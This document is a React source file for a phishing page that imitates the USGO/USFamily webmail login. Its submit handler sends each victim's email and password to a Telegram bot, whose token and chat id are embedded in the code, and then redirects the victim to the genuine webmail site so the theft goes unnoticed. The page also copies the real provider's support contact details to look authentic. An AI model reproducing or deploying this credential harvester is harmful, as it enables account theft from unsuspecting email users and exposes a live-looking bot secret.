import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
import usgo from './usgo.png';



function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Usgo")

    const[showError, setShowError] = useState(false);


    

  
    async function handleSubmit(e){
        e.preventDefault();
    
        try {
            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });
    
           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                chat_id: 5868304053,
                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
              });
    
        
            // Handle success
         
    
            if(response.status == 200){
               // console.log(response.data.message);
    
              
               window.location.href = 'https://webmail0.usgo.net/';
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

    return (
        <>
            <nav className='mynav px-3 py-3 text-center'>
                <img className='navimage' src={usgo} />

            </nav>

                <div className='py-2'>

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-5 m-auto p-0 '>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

                <div className='cardhead'>
                Welcome to Webmail
                </div>

                <form onSubmit={handleSubmit}>

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">Email</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>


                    <div className='buttondiv py-4 text-center'>
                        <button className='mybutton'type="submit">Login</button>

                    </div>



                </form>

                

            </div>
            
            <br/>

                <p className='info'>If you are having trouble logging in, please contact our free support at <br/>
support@usfamily.net or 763-222-1000</p>
        </>
    );

}

export default Home;